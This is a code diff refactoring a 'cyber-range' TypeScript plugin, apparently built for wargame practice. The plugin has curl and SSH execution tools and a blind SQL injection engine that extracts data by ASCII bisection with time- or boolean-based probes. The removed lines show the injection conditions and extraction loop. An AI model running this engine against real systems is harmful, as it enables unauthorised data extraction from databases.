@@ -13,6 +13,10 @@ import z from '@deepseek-ai/schemastery'
 import { defineTool } from '@deepseek-ai/dsh-tools'
 import { request as httpRequest, type IncomingMessage } from 'node:http'
 import { spawn } from 'node:child_process'
+import {
+  buildCurlCmd, parseCurlOutput, buildSshCmd, buildPostBody, buildGetPath, basicAuthOf,
+  normalizeCharset, charsetBounds, bisectExtract, judgeProbe, defaultSleepThresholdMs,
+} from './logic.js'
 
 export const name = 'cyber-range'
 export const inject = ['tools'] as const
@@ -98,9 +102,7 @@ function sshExec(opts: {
   proxyPort: number
   timeoutMs?: number
 }): Promise<{ ok: boolean; stdout: string; stderr: string; exitCode: number }> {
-  const proxyCmd = `nc -X connect -x ${opts.proxyHost}:${opts.proxyPort} %h %p`
-  const sshCmd = `sshpass -p '${opts.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o ProxyCommand='${proxyCmd}' ${opts.user}@${opts.host} -p ${opts.port} '${opts.command}'`
-  return spawnWsl(sshCmd, opts.timeoutMs ?? 60000)
+  return spawnWsl(buildSshCmd(opts), opts.timeoutMs ?? 60000)
 }
 
 // ════════════════════════ SQL 盲注引擎（otw_blind） ════════════════════════
@@ -115,14 +117,8 @@ async function blindProbe(
   headers: Record<string, string>,
 ): Promise<{ dtMs: number; body: string }> {
   const t0 = Date.now()
-  const payload = new URLSearchParams()
   if (method === 'POST') {
-    for (const pair of data.split('&')) {
-      const [k, ...rest] = pair.split('=')
-      if (k) payload.append(decodeURIComponent(k), decodeURIComponent(rest.join('=')))
-    }
-    payload.set(injectParam, injectValue)
-    const body = payload.toString()
+    const body = buildPostBody(data, injectParam, injectValue)
     const res = await rawHttp({
       hostname: url.hostname, port: Number(url.port || 80), path: url.pathname + url.search,
       method: 'POST', headers: { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' }, body,
@@ -130,9 +126,7 @@ async function blindProbe(
     return { dtMs: Date.now() - t0, body: res.body }
   }
   // GET
-  const sp = new URLSearchParams(url.search)
-  sp.set(injectParam, injectValue)
-  const path = url.pathname + '?' + sp.toString()
+  const path = buildGetPath(url, injectParam, injectValue)
   const res = await rawHttp({
     hostname: url.hostname, port: Number(url.port || 80), path,
     method: 'GET', headers,
@@ -164,22 +158,16 @@ async function blindExtract(opts: {
   const data = opts.data ?? ''
   const maxLen = opts.maxLen ?? 40
   const sleepSec = opts.sleepSec ?? 2
-  const sleepThresholdMs = opts.sleepThresholdMs ?? Math.max(1200, sleepSec * 1000 * 0.6)
+  const sleepThresholdMs = opts.sleepThresholdMs ?? defaultSleepThresholdMs(sleepSec)
   const charset = opts.charset ?? 'alnum'
 
-  const buildCharset = (): string[] => {
-    if (charset === 'printable') return Array.from({ length: 95 }, (_, i) => String.fromCharCode(32 + i))
-    if (charset === 'alnum') return '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split('')
-    return charset.split('')
-  }
-  const cs = buildCharset().sort()
-  const codes = cs.map((c) => c.charCodeAt(0))
-  const csMin = codes.length > 0 ? Math.min(...codes) : 32
-  const csMax = codes.length > 0 ? Math.max(...codes) : 126
+  const cs = normalizeCharset(charset)
+  const { csMin, csMax } = charsetBounds(cs)
 
   const url = new URL(opts.url)
-  const headers: Record<string, string> = { Host: url.hostname }
-  if (url.username) headers.Authorization = 'Basic ' + Buffer.from(decodeURIComponent(url.username) + ':' + decodeURIComponent(url.password)).toString('base64')
+  const auth = basicAuthOf(url)
+  const headers: Record<string, string> = { Host: auth.host }
+  if (auth.authorization) headers.Authorization = auth.authorization
   // 去掉 url 里的 user:pass（保留 host）
   url.username = ''
   url.password = ''
@@ -196,41 +184,13 @@ async function blindExtract(opts: {
       bodies.push(r.body)
       queries++
     }
-    samples.sort((a, b) => a - b)
-    if (opts.mode === 'time') return (samples[1] ?? 0) > sleepThresholdMs
-    const trueText = opts.trueText ?? ''
-    // bool 模式：多数样本含 trueText 判定为真
-    const hits = bodies.filter((b) => b.includes(trueText)).length
-    return hits >= 2
+    return judgeProbe(opts.mode, samples, bodies, sleepThresholdMs, opts.trueText ?? '')
   }
 
-  const cond = (pos: number, asc: number): string => {
-    if (opts.condType === 'ascii_gt') return `ASCII(SUBSTRING(${opts.expr},${pos},1)) > ${asc}`
-    if (opts.condType === 'ascii_eq') return `ASCII(SUBSTRING(${opts.expr},${pos},1)) = ${asc}`
-    // like_prefix：用 char 范围二分（LIKE 通配符陷阱：% _ 需转义或用 ascii 比较）
-    return `ASCII(SUBSTRING(${opts.expr},${pos},1)) > ${asc}`
-  }
-
-  let result = ''
-  try {
-    for (let pos = 1; pos <= maxLen; pos++) {
-      // ASCII 二分（在字符集范围内）
-      let lo = csMin - 1
-      let hi = csMax + 1
-      while (lo + 1 < hi) {
-        const mid = Math.floor((lo + hi) / 2)
-        if (await probe(cond(pos, mid))) lo = mid
-        else hi = mid
-      }
-      if (hi < csMin || hi > csMax) break
-      const c = String.fromCharCode(hi)
-      if (!cs.includes(c)) break
-      result += c
-    }
-  } catch (e) {
-    return { result, queries, error: e instanceof Error ? e.message : String(e) }
-  }
-  return { result, queries }
+  const { result, error } = await bisectExtract({
+    probe, chars: cs, csMin, csMax, maxLen, condType: opts.condType, expr: opts.expr,
+  })
+  return error ? { result, queries, error } : { result, queries }
 }
 
 // ════════════════════════ 插件挂载 ════════════════════════
@@ -257,25 +217,11 @@ export function apply(ctx: Context, config: Config): void {
     },
     async execute(args: { host: string; user?: string; pass?: string; path?: string; method?: string; data?: string; cookie?: string; userAgent?: string; resolveIp?: string; maxBodyChars?: number }) {
       try {
-        const method = (args.method ?? 'GET').toUpperCase()
-        const path = args.path ?? '/'
-        const resolveFlag = args.resolveIp ? `--resolve ${args.host}:80:${args.resolveIp} ` : ''
-        const authFlag = args.user ? `-u '${args.user}:${args.pass ?? ''}' ` : ''
-        const cookieFlag = args.cookie ? `-b '${args.cookie}' ` : ''
-        const uaFlag = args.userAgent ? `-A '${args.userAgent.replace(/'/g, "'\\''")}' ` : ''
-        const dataFlag = method === 'POST' && args.data ? `-d '${args.data.replace(/'/g, "'\\''")}' ` : ''
-        const curlCmd = `curl -s --noproxy "*" --max-time 20 ${resolveFlag}${authFlag}${cookieFlag}${uaFlag}${dataFlag}-w '\\n%{http_code}' 'http://${args.host}${path}'`
+        const curlCmd = buildCurlCmd(args)
         // 经 WSL 执行（web 进程网络受限，WSL 复用完整工具链+网络通道）
         const out = await spawnWsl(curlCmd, 30000)
         if (!out.ok) return { status: 0, body: '', truncated: false, error: out.stderr.slice(0, 500) }
-        // 最后一行是 http_code，其余是 body
-        const lines = out.stdout.split('\n')
-        const codeStr = lines.length > 1 ? (lines[lines.length - 1] ?? '').trim() : ''
-        const status = Number(codeStr) || 0
-        const body = lines.length > 1 ? lines.slice(0, -1).join('\n') : out.stdout
-        const maxChars = args.maxBodyChars ?? 12000
-        const truncated = body.length > maxChars
-        return { status, body: truncated ? body.slice(0, maxChars) : body, truncated }
+        return parseCurlOutput(out.stdout, args.maxBodyChars ?? 12000)
       } catch (e) {
         return { status: 0, body: '', truncated: false, error: e instanceof Error ? e.message : String(e) }
       }
